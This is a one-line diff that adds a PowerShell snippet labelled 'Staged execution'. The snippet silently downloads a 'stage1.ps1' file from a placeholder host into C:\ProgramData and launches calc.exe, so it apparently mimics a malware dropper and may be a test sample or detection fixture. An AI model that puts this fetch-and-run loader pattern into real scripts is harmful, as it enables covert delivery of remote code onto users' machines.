@@ -1,0 +1,1 @@
+<# Staged execution #> $FetchUrl = "http://example.org:80/stage1.ps1"; $DownloadPath = "C:\ProgramData\stage2.bin"; $ConnectionTimeout = 130; Start-BitsTransfer -Source $FetchUrl -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $StageMarker = "stage-13"
